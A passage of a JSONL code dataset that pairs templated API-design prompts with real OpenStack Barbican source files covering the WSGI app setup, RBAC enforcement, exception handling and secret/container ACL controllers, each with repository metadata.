HTML files (e.g. \".xhtml\").\n# html_file_suffix = None\n\n# Output file base name for HTML help builder.\nhtmlhelp_basename = 'keymanager-api-guide'\n\n\n# -- Options for LaTeX output ---------------------------------------------\n\nlatex_elements = {\n    # The paper size ('letterpaper' or 'a4paper').\n    # 'papersize': 'letterpaper',\n\n    # The font size ('10pt', '11pt' or '12pt').\n    # 'pointsize': '10pt',\n\n    # Additional stuff for the LaTeX preamble.\n    # 'preamble': '',\n}\n\n# Grouping the document tree into LaTeX files. List of tuples\n# (source start file, target name, title,\n#  author, documentclass [howto, manual, or own class]).\nlatex_documents = [\n    ('index', 'KeyManagerAPI.tex', 'Key Manager API Documentation',\n     'OpenStack contributors', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n# latex_logo = None\n\n# For \"manual\" documents, if this is true, then toplevel headings are parts,\n# not chapters.\n# latex_use_parts = False\n\n# If true, show page references after internal links.\n# latex_show_pagerefs = False\n\n# If true, show URL addresses after external links.\n# latex_show_urls = False\n\n# Documents to append as an appendix to all manuals.\n# latex_appendices = []\n\n# If false, no module index is generated.\n# latex_domain_indices = True\n\n\n# -- Options for manual page output ---------------------------------------\n\n# One entry per manual page. List of tuples\n# (source start file, name, description, authors, manual section).\nman_pages = [\n    ('index', 'keymanagerapi', 'Key Manager API Documentation',\n     ['OpenStack contributors'], 1)\n]\n\n# If true, show URL addresses after external links.\n# man_show_urls = False\n\n\n# -- Options for Texinfo output -------------------------------------------\n\n# Grouping the document tree into Texinfo files. List of tuples\n# (source start file, target name, title, author,\n#  dir menu entry, description, category)\ntexinfo_documents = [\n    ('index', 'KeyManagerAPIGuide', 'Key Manager API Guide',\n     'OpenStack contributors', 'APIGuide',\n     'This guide teaches OpenStack Key Manager service users concepts about '\n     'managing keys in an OpenStack cloud with the Key Manager API.',\n     'Miscellaneous'),\n]\n\n# Documents to append as an appendix to all manuals.\n# texinfo_appendices = []\n\n# If false, no module index is generated.\n# texinfo_domain_indices = True\n\n# How to display URL addresses: 'footnote', 'no', or 'inline'.\n# texinfo_show_urls = 'footnote'\n\n# If true, do not generate a @detailmenu in the \"Top\" node's menu.\n# texinfo_no_detailmenu = False\n\n# -- Options for Internationalization output ------------------------------\nlocale_dirs = ['locale/']\n\n# -- Options for PDF output --------------------------------------------------\n\npdf_documents = [\n    ('index', 'KeyManagerAPIGuide', 'Key Manager API Guide', 'OpenStack '\n     'contributors')\n]\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "api-guide/source/conf.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.62, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 265}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2013-2015 Rackspace, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n# implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"\nAPI handler for Barbican\n\"\"\"\nimport pkgutil\n\nfrom oslo_policy import policy\nfrom oslo_serialization import jsonutils as json\nimport pecan\n\nfrom barbican.common import config\nfrom barbican.common import exception\nfrom barbican.common import utils\nfrom barbican import i18n as u\n\n\nLOG = utils.getLogger(__name__)\nCONF = config.CONF\n\n\nclass ApiResource(object):\n    \"\"\"Base class for API resources.\"\"\"\n    pass\n\n\ndef load_body(req, resp=None, validator=None):\n    \"\"\"Helper function for loading an HTTP request body from JSON.\n\n    This body is placed into into a Python dictionary.\n\n    :param req: The HTTP request instance to load the body from.\n    :param resp: The HTTP response instance.\n    :param validator: The JSON validator to enforce.\n    :return: A dict of values from the JSON request.\n    \"\"\"\n    try:\n        body = req.body_file.read(CONF.max_allowed_request_size_in_bytes)\n        req.body_file.seek(0)\n    except IOError:\n        LOG.exception(\"Problem reading request JSON stream.\")\n        pecan.abort(500, u._('Read Error'))\n\n    try:\n        # TODO(jwood): Investigate how to get UTF8 format via openstack\n        # jsonutils:\n        #     parsed_body = json.loads(raw_json, 'utf-8')\n        parsed_body = json.loads(body)\n        strip_whitespace(parsed_body)\n    except ValueError:\n        LOG.exception(\"Problem loading request JSON.\")\n        pecan.abort(400, u._('Malformed JSON'))\n\n    if validator:\n        try:\n            parsed_body = validator.validate(parsed_body)\n        except exception.BarbicanHTTPException as e:\n            LOG.exception(str(e))\n            pecan.abort(e.status_code, e.client_message)\n\n    return parsed_body\n\n\ndef generate_safe_exception_message(operation_name, excep):\n    \"\"\"Generates an exception message that is 'safe' for clients to consume.\n\n    A 'safe' message is one that doesn't contain sensitive information that\n    could be used for (say) cryptographic attacks on Barbican. That generally\n    means that em.CryptoXxxx should be captured here and with a simple\n    message created on behalf of them.\n\n    :param operation_name: Name of attempted operation, with a 'Verb noun'\n                           format (e.g. 'Create Secret).\n    :param excep: The Exception instance that halted the operation.\n    :return: (status, message) where 'status' is one of the webob.exc.HTTP_xxx\n                               codes, and 'message' is the sanitized message\n                               associated with the error.\n    \"\"\"\n    message = None\n    reason = None\n    status = 500\n\n    try:\n        raise excep\n    except (policy.PolicyNotAuthorized, policy.InvalidScope):\n        message = u._(\n            '{operation} attempt not allowed - '\n            'please review your '\n            'user/project privileges').format(operation=operation_name)\n        status = 403\n\n    except exception.BarbicanHTTPException as http_exception:\n        reason = http_exception.client_message\n        status = http_exception.status_code\n    except Exception:\n        message = u._('{operation} failure seen - please contact site '\n                      'administrator.').format(operation=operation_name)\n\n    if reason:\n        message = u._('{operation} issue seen - {reason}.').format(\n            operation=operation_name, reason=reason)\n\n    return status, message\n\n\n@pkgutil.simplegeneric\ndef get_items(obj):\n    \"\"\"This is used to get items from either a list or a dictionary.\n\n    While false generator is need to process scalar object\n    \"\"\"\n\n    while False:\n        yield None\n\n\n@get_items.register(dict)\ndef _json_object(obj):\n    return obj.items()\n\n\n@get_items.register(list)\ndef _json_array(obj):\n    return enumerate(obj)\n\n\ndef strip_whitespace(json_data):\n    \"\"\"Recursively trim values from the object passed in using get_items().\"\"\"\n\n    for key, value in get_items(json_data):\n        if hasattr(value, 'strip'):\n            json_data[key] = value.strip()\n        else:\n            strip_whitespace(value)\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/__init__.py", "language": "python", "complexity": "medium", "star_count": 241, "quality_score": 0.71, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 148}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2013-2015 Rackspace, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n# implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"\nAPI application handler for Barbican\n\"\"\"\nimport os\n\nfrom paste import deploy\nimport pecan\n\ntry:\n    import newrelic.agent\n    newrelic_loaded = True\nexcept ImportError:\n    newrelic_loaded = False\n\nfrom oslo_log import log\n\nfrom barbican.api.controllers import versions\nfrom barbican.api import hooks\nfrom barbican.common import config\nfrom barbican.model import repositories\nfrom barbican import queue\n\nCONF = config.CONF\n\nif newrelic_loaded:\n    newrelic.agent.initialize(\n        os.environ.get('NEW_RELIC_CONFIG_FILE', '/etc/newrelic/newrelic.ini'),\n        os.environ.get('NEW_RELIC_ENVIRONMENT')\n    )\n\n\ndef build_wsgi_app(controller=None, transactional=False):\n    \"\"\"WSGI application creation helper\n\n    :param controller: Overrides default application controller\n    :param transactional: Adds transaction hook for all requests\n    \"\"\"\n    request_hooks = [hooks.JSONErrorHook()]\n    if transactional:\n        request_hooks.append(hooks.BarbicanTransactionHook())\n    if newrelic_loaded:\n        request_hooks.insert(0, hooks.NewRelicHook())\n\n    # Create WSGI app\n    wsgi_app = pecan.Pecan(\n        controller or versions.AVAILABLE_VERSIONS[versions.DEFAULT_VERSION](),\n        hooks=request_hooks,\n        force_canonical=False\n    )\n    # clear the session created in controller initialization     60\n    repositories.clear()\n    return wsgi_app\n\n\ndef main_app(func):\n    def _wrapper(global_config, **local_conf):\n        # Queuing initialization\n        queue.init(CONF, is_server_side=False)\n\n        # Configure oslo logging and configuration services.\n        log.setup(CONF, 'barbican')\n        LOG = log.getLogger(__name__)\n\n        config.setup_remote_pydev_debug()\n\n        # Initializing the database engine and session factory before the app\n        # starts ensures we don't lose requests due to lazy initialization of\n        # db connections.\n        try:\n            repositories.setup_database_engine_and_factory(\n                initialize_secret_stores=True\n            )\n            repositories.commit()\n        except Exception:\n            LOG.exception('Failed to sync secret_stores table.')\n            repositories.rollback()\n            raise\n\n        wsgi_app = func(global_config, **local_conf)\n\n        if newrelic_loaded:\n            wsgi_app = newrelic.agent.WSGIApplicationWrapper(wsgi_app)\n\n        LOG.info('Barbican app created and initialized')\n        return wsgi_app\n    return _wrapper\n\n\n@main_app\ndef create_main_app(global_config, **local_conf):\n    \"\"\"uWSGI factory method for the Barbican-API application.\"\"\"\n    # Setup app with transactional hook enabled\n    return build_wsgi_app(versions.V1Controller(), transactional=True)\n\n\ndef create_version_app(global_config, **local_conf):\n    wsgi_app = pecan.make_app(versions.VersionsController())\n    return wsgi_app\n\n\ndef get_api_wsgi_script():\n    conf = '/etc/barbican/barbican-api-paste.ini'\n    application = deploy.loadapp('config:%s' % conf)\n    return application\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/app.py", "language": "python", "complexity": "medium", "star_count": 241, "quality_score": 0.71, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 120}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport collections.abc\n\nfrom oslo_policy import policy\nimport pecan\nfrom webob import exc\n\nfrom barbican import api\nfrom barbican.common import accept\nfrom barbican.common import config\nfrom barbican.common import utils\nfrom barbican import i18n as u\n\n\nCONF = config.CONF\nLOG = utils.getLogger(__name__)\n\n\ndef is_json_request_accept(req):\n    \"\"\"Test if http request 'accept' header configured for JSON response.\n\n    :param req: HTTP request\n    :return: True if need to return JSON response.\n    \"\"\"\n    return (\n        type(req.accept) is accept.NoHeaderType or\n        type(req.accept) is accept.ValidHeaderType and (\n            req.accept.header_value == 'application/json' or\n            req.accept.header_value == '*/*'\n        )\n    )\n\n\ndef _get_barbican_context(req):\n    if 'barbican.context' in req.environ:\n        return req.environ['barbican.context']\n    else:\n        return None\n\n\ndef _do_enforce_rbac(inst, req, action_name, ctx, **kwargs):\n    \"\"\"Enforce RBAC based on 'request' information.\"\"\"\n    if action_name and ctx:\n\n        # Enforce special case: secret GET decryption\n        if 'secret:get' == action_name and not is_json_request_accept(req):\n            action_name = 'secret:decrypt'  # Override to perform special rules\n\n        target_name, target_data = inst.get_acl_tuple(req, **kwargs)\n        policy_dict = {\n            \"enforce_new_defaults\": CONF.oslo_policy.enforce_new_defaults\n        }\n        if target_name and target_data:\n            policy_dict['target'] = {target_name: target_data}\n\n        # Enforce access controls.\n        if ctx.policy_enforcer:\n            target = flatten(policy_dict)\n            ctx.policy_enforcer.authorize(action_name, target,\n                                          ctx, do_raise=True)\n\n\ndef enforce_rbac(action_name='default'):\n    \"\"\"Decorator handling RBAC enforcement on behalf of REST verb methods.\"\"\"\n\n    def rbac_decorator(fn):\n        def enforcer(inst, *args, **kwargs):\n            # Enforce RBAC rules.\n\n            # context placed here by context.py\n            # middleware\n            ctx = _get_barbican_context(pecan.request)\n            external_project_id = None\n            if ctx:\n                external_project_id = ctx.project_id\n\n            _do_enforce_rbac(inst, pecan.request, action_name, ctx, **kwargs)\n            # insert external_project_id as the first arg to the guarded method\n            args = list(args)\n            args.insert(0, external_project_id)\n            # Execute guarded method now.\n            return fn(inst, *args, **kwargs)\n\n        return enforcer\n\n    return rbac_decorator\n\n\ndef handle_exceptions(operation_name=u._('System')):\n    \"\"\"Decorator handling generic exceptions from REST methods.\"\"\"\n\n    def exceptions_decorator(fn):\n\n        def handler(inst, *args, **kwargs):\n            try:\n                return fn(inst, *args, **kwargs)\n            except exc.HTTPError:\n                LOG.exception('Webob error seen')\n                raise  # Already converted to Webob exception, just reraise\n            # In case PolicyNotAuthorized, we do not want to expose payload by\n            # logging exception, so just LOG.error\n            except policy.PolicyNotAuthorized as pna:\n                status, message = api.generate_safe_exception_message(\n                    operation_name, pna)\n                LOG.error(message)\n                pecan.abort(status, message)\n            except Exception as e:\n                # In case intervening modules have disabled logging.\n                LOG.logger.disabled = False\n\n                status, message = api.generate_safe_exception_message(\n                    operation_name, e)\n                LOG.exception(message)\n                pecan.abort(status, message)\n\n        return handler\n\n    return exceptions_decorator\n\n\ndef _do_enforce_content_types(pecan_req, valid_content_types):\n    \"\"\"Content type enforcement\n\n    Check to see that content type in the request is one of the valid\n    types passed in by our caller.\n    \"\"\"\n    if pecan_req.content_type not in valid_content_types:\n        m = u._(\n            \"Unexpected content type. Expected content types \"\n            \"are: {expected}\"\n        ).format(\n            expected=valid_content_types\n        )\n        pecan.abort(415, m)\n\n\ndef enforce_content_types(valid_content_types=[]):\n    \"\"\"Decorator handling content type enforcement on behalf of REST verbs.\"\"\"\n\n    def content_types_decorator(fn):\n\n        def content_types_enforcer(inst, *args, **kwargs):\n            _do_enforce_content_types(pecan.request, valid_content_types)\n            return fn(inst, *args, **kwargs)\n\n        return content_types_enforcer\n\n    return content_types_decorator\n\n\ndef flatten(d, parent_key=''):\n    \"\"\"Flatten a nested dictionary\n\n    Converts a dictionary with nested values to a single level flat\n    dictionary, with dotted notation for each key.\n\n    \"\"\"\n    items = []\n    for k, v in d.items():\n        new_key = parent_key + '.' + k if parent_key else k\n        if isinstance(v, collections.abc.MutableMapping):\n            items.extend(flatten(v, new_key).items())\n        else:\n            items.append((new_key, v))\n    return dict(items)\n\n\nclass ACLMixin(object):\n\n    def __init__(self):\n        self.secret = None\n        self.container = None\n\n    def get_acl_tuple(self, req, **kwargs):\n        if self.secret is not None:\n            entity = 'secret'\n        elif self.container is not None:\n            entity = 'container'\n        else:\n            return None, None\n        entity_acls = getattr(getattr(self, entity), '{}_acls'.format(entity))\n        acl = self.get_acl_dict_for_user(req, entity_acls)\n        acl['project_id'] = getattr(self, entity).project.external_id\n        acl['creator_id'] = getattr(self, entity).creator_id\n        return entity, acl\n\n    def get_acl_dict_for_user(self, req, acl_list):\n        \"\"\"Get acl operation found for token user in acl list.\n\n        Token user is looked into users list present for each acl operation.\n        If there is a match, it means that ACL data is applicable for policy\n        logic. Policy logic requires data as dictionary so this method capture\n        acl's operation, project_access data in that format.\n\n        For operation value, matching ACL record's operation is stored in dict\n        as key and value both.\n        project_access flag is intended to make secret/container private for a\n        given operation. It doesn't require user match. So its captured in dict\n        format where key is prefixed with related operation and flag is used as\n        its value.\n\n        Then for acl related policy logic, this acl dict data is combined with\n        target entity (secret or container) creator_id and project id. The\n        whole dict serves as target in policy enforcement logic i.e. right\n        hand side of policy rule.\n\n        Following is sample outcome where secret or container has ACL defined\n        and token user is among the ACL users defined for 'read' and 'list'\n        operation.\n\n        {'read': 'read', 'list': 'list', 'read_project_access': True,\n        'list_project_access': True }\n\n        Its possible that ACLs are defined without any user, they just\n        have project_access flag set. This means only creator can read or list\n        ACL entities. In that case, dictionary output can be as follows.\n\n        {'read_project_access': False, 'list_project_access': False }\n\n        \"\"\"\n        ctxt = _get_barbican_context(req)\n        if not ctxt:\n            return {}\n        acl_dict = {acl.operation: acl.operation for acl in acl_list\n                    if ctxt.user_id in acl.to_dict_fields().get('users', [])}\n        co_dict = {'%s_project_access' % acl.operation: acl.project_access for\n                   acl in acl_list if acl.project_access is not None}\n        if not co_dict:\n            \"\"\"\n            The co_dict is empty when the entity (secret or container) has no\n            acls in its acl_list.  This causes any policy with\n\n                \"%(target.secret.read_project_access)s\"\n            or\n                \"%(target.container.read_project_access)s\"\n\n            to always evaluate to False.  This is probelmatic because we want\n            to allow project access by default (with additional role checks).\n            To work around this we allow read here.\n\n            When the entity has an acl, co_dict will use the value from the\n            database, and this if statement will be skipped.\n            \"\"\"\n            co_dict = {'read_project_access': True}\n        acl_dict.update(co_dict)\n\n        return acl_dict\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/__init__.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.77, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 259}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\n\nimport pecan\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.common import hrefs\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\nfrom barbican.model import models\nfrom barbican.model import repositories as repo\n\nLOG = utils.getLogger(__name__)\n\n\ndef _convert_acl_to_response_format(acl, acls_dict):\n    fields = acl.to_dict_fields()\n    operation = fields['operation']\n\n    acl_data = {}  # dict for each acl operation data\n\n    acl_data['project-access'] = fields['project_access']\n    acl_data['users'] = fields.get('users', [])\n    acl_data['created'] = fields['created']\n    acl_data['updated'] = fields['updated']\n\n    acls_dict[operation] = acl_data\n\n\nDEFAULT_ACL = {'read': {'project-access': True}}\n\n\nclass SecretACLsController(controllers.ACLMixin):\n    \"\"\"Handles SecretACL requests by a given secret id.\"\"\"\n\n    def __init__(self, secret):\n        super().__init__()\n        self.secret = secret\n        self.secret_project_id = self.secret.project.external_id\n        self.acl_repo = repo.get_secret_acl_repository()\n        self.validator = validators.ACLValidator()\n\n    def get_acl_tuple(self, req, **kwargs):\n        d = {'project_id': self.secret_project_id,\n             'creator_id': self.secret.creator_id}\n        return 'secret', d\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('SecretACL(s) retrieval'))\n    @controllers.enforce_rbac('secret_acls:get')\n    def on_get(self, external_project_id, **kw):\n        LOG.debug('Start secret ACL on_get '\n                  'for secret-ID %s:', self.secret.id)\n\n        return self._return_acl_list_response(self.secret.id)\n\n    @index.when(method='PATCH', template='json')\n    @controllers.handle_exceptions(u._('SecretACL(s) Update'))\n    @controllers.enforce_rbac('secret_acls:put_patch')\n    @controllers.enforce_content_types(['application/json'])\n    def on_patch(self, external_project_id, **kwargs):\n        \"\"\"Handles update of existing secret acl requests.\n\n        At least one secret ACL needs to exist for update to proceed.\n        In update, multiple operation ACL payload can be specified as\n        mentioned in sample below. A specific ACL can be updated by its\n        own id via SecretACLController patch request.\n\n        {\n          \"read\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\",\n              \"20b63d71f90848cf827ee48074f213b7\",\n              \"c7753f8da8dc4fbea75730ab0b6e0ef4\"\n            ]\n          },\n          \"write\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\"\n            ],\n            \"project-access\":true\n          }\n        }\n        \"\"\"\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start on_patch...%s', data)\n\n        existing_acls_map = {acl.operation: acl for acl in\n                             self.secret.secret_acls}\n        for operation in filter(lambda x: data.get(x),\n                                validators.ACL_OPERATIONS):\n            project_access = data[operation].get('project-access')\n            user_ids = data[operation].get('users')\n            s_acl = None\n            if operation in existing_acls_map:  # update if matching acl exists\n                s_acl = existing_acls_map[operation]\n                if project_access is not None:\n                    s_acl.project_access = project_access\n            else:\n                s_acl = models.SecretACL(self.secret.id, operation=operation,\n                                         project_access=project_access)\n            self.acl_repo.create_or_replace_from(self.secret, secret_acl=s_acl,\n                                                 user_ids=user_ids)\n\n        acl_ref = '{0}/acl'.format(\n            hrefs.convert_secret_to_href(self.secret.id))\n        return {'acl_ref': acl_ref}\n\n    @index.when(method='PUT', template='json')\n    @controllers.handle_exceptions(u._('SecretACL(s) Update'))\n    @controllers.enforce_rbac('secret_acls:put_patch')\n    @controllers.enforce_content_types(['application/json'])\n    def on_put(self, external_project_id, **kwargs):\n        \"\"\"Handles update of existing secret acl requests.\n\n        Replaces existing secret ACL(s) with input ACL(s) data. Existing\n        ACL operation not specified in input are removed as part of update.\n        For missing project-access in ACL, true is used as default.\n        In update, multiple operation ACL payload can be specified as\n        mentioned in sample below. A specific ACL can be updated by its\n        own id via SecretACLController patch request.\n\n        {\n          \"read\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\",\n              \"20b63d71f90848cf827ee48074f213b7\",\n              \"c7753f8da8dc4fbea75730ab0b6e0ef4\"\n            ]\n          },\n          \"write\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\"\n            ],\n            \"project-access\":false\n          }\n        }\n\n        Every secret, by default, has an implicit ACL in case client has not\n        defined an explicit ACL. That default ACL definition, DEFAULT_ACL,\n        signifies that a secret by default has project based access i.e. client\n        with necessary roles on secret project can access the secret. That's\n        why when ACL is added to a secret, it always returns 200 (and not 201)\n        indicating existence of implicit ACL on a secret.\n        \"\"\"\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start on_put...%s', data)\n\n        existing_acls_map = {acl.operation: acl for acl in\n                             self.secret.secret_acls}\n        for operation in filter(lambda x: data.get(x),\n                                validators.ACL_OPERATIONS):\n            project_access = data[operation].get('project-access', True)\n            user_ids = data[operation].get('users', [])\n            s_acl = None\n            if operation in existing_acls_map:  # update if matching acl exists\n                s_acl = existing_acls_map.pop(operation)\n                s_acl.project_access = project_access\n            else:\n                s_acl = models.SecretACL(self.secret.id, operation=operation,\n                                         project_access=project_access)\n            self.acl_repo.create_or_replace_from(self.secret, secret_acl=s_acl,\n                                                 user_ids=user_ids)\n        # delete remaining existing acls as they are not present in input.\n        for acl in existing_acls_map.values():\n            self.acl_repo.delete_entity_by_id(entity_id=acl.id,\n                                              external_project_id=None)\n        acl_ref = '{0}/acl'.format(\n            hrefs.convert_secret_to_href(self.secret.id))\n        return {'acl_ref': acl_ref}\n\n    @index.when(method='DELETE', template='json')\n    @controllers.handle_exceptions(u._('SecretACL(s) deletion'))\n    @controllers.enforce_rbac('secret_acls:delete')\n    def on_delete(self, external_project_id, **kwargs):\n\n        count = self.acl_repo.get_count(self.secret.id)\n        if count > 0:\n            self.acl_repo.delete_acls_for_secret(self.secret)\n\n    def _return_acl_list_response(self, secret_id):\n        result = self.acl_repo.get_by_secret_id(secret_id)\n\n        acls_data = {}\n        if result:\n            for acl in result:\n                _convert_acl_to_response_format(acl, acls_data)\n        if not acls_data:\n            acls_data = DEFAULT_ACL.copy()\n        return acls_data\n\n\nclass ContainerACLsController(controllers.ACLMixin):\n    \"\"\"Handles ContainerACL requests by a given container id.\"\"\"\n\n    def __init__(self, container):\n        super().__init__()\n        self.container = container\n        self.container_id = container.id\n        self.acl_repo = repo.get_container_acl_repository()\n        self.container_repo = repo.get_container_repository()\n        self.validator = validators.ACLValidator()\n        self.container_project_id = container.project.external_id\n\n    def get_acl_tuple(self, req, **kwargs):\n        d = {'project_id': self.container_project_id,\n             'creator_id': self.container.creator_id}\n        return 'container', d\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('ContainerACL(s) retrieval'))\n    @controllers.enforce_rbac('container_acls:get')\n    def on_get(self, external_project_id, **kw):\n        LOG.debug('Start container ACL on_get '\n                  'for container-ID %s:', self.container_id)\n\n        return self._return_acl_list_response(self.container.id)\n\n    @index.when(method='PATCH', template='json')\n    @controllers.handle_exceptions(u._('ContainerACL(s) Update'))\n    @controllers.enforce_rbac('container_acls:put_patch')\n    @controllers.enforce_content_types(['application/json'])\n    def on_patch(self, external_project_id, **kwargs):\n        \"\"\"Handles update of existing container acl requests.\n\n        At least one container ACL needs to exist for update to proceed.\n        In update, multiple operation ACL payload can be specified as\n        mentioned in sample below. A specific ACL can be updated by its\n        own id via ContainerACLController patch request.\n\n        {\n          \"read\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\",\n              \"20b63d71f90848cf827ee48074f213b7\",\n              \"c7753f8da8dc4fbea75730ab0b6e0ef4\"\n            ]\n          },\n          \"write\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\"\n            ],\n            \"project-access\":false\n          }\n        }\n        \"\"\"\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start ContainerACLsController on_patch...%s', data)\n\n        existing_acls_map = {acl.operation: acl for acl in\n                             self.container.container_acls}\n        for operation in filter(lambda x: data.get(x),\n                                validators.ACL_OPERATIONS):\n            project_access = data[operation].get('project-access')\n            user_ids = data[operation].get('users')\n            if operation in existing_acls_map:  # update if matching acl exists\n                c_acl = existing_acls_map[operation]\n                if project_access is not None:\n                    c_acl.project_access = project_access\n            else:\n                c_acl = models.ContainerACL(self.container.id,\n                                            operation=operation,\n                                            project_access=project_access)\n            self.acl_repo.create_or_replace_from(self.container,\n                                                 container_acl=c_acl,\n                                                 user_ids=user_ids)\n\n        acl_ref = '{0}/acl'.format(\n            hrefs.convert_container_to_href(self.container.id))\n        return {'acl_ref': acl_ref}\n\n    @index.when(method='PUT', template='json')\n    @controllers.handle_exceptions(u._('ContainerACL(s) Update'))\n    @controllers.enforce_rbac('container_acls:put_patch')\n    @controllers.enforce_content_types(['application/json'])\n    def on_put(self, external_project_id, **kwargs):\n        \"\"\"Handles update of existing container acl requests.\n\n        Replaces existing container ACL(s) with input ACL(s) data. Existing\n        ACL operation not specified in input are removed as part of update.\n        For missing project-access in ACL, true is used as default.\n        In update, multiple operation ACL payload can be specified as\n        mentioned in sample below. A specific ACL can be updated by its\n        own id via ContainerACLController patch request.\n\n        {\n          \"read\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\",\n              \"20b63d71f90848cf827ee48074f213b7\",\n              \"c7753f8da8dc4fbea75730ab0b6e0ef4\"\n            ]\n          },\n          \"write\":{\n            \"users\":[\n              \"5ecb18f341894e94baca9e8c7b6a824a\"\n            ],\n            \"project-access\":false\n          }\n        }\n\n        Every container, by default, has an implicit ACL in case client has not\n        defined an explicit ACL. That default ACL definition, DEFAULT_ACL,\n        signifies that a container by default has project based access i.e.\n        client with necessary roles on container project can access the\n        container. That's why when ACL is added to a container, it always\n        returns 200 (and not 201) indicating existence of implicit ACL on a\n        container.\n        \"\"\"\n\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start ContainerACLsController on_put...%s', data)\n\n        existing_acls_map = {acl.operation: acl for acl in\n                             self.container.container_acls}\n        for operation in filter(lambda x: data.get(x),\n                                validators.ACL_OPERATIONS):\n            project_access = data[operation].get('project-access', True)\n            user_ids = 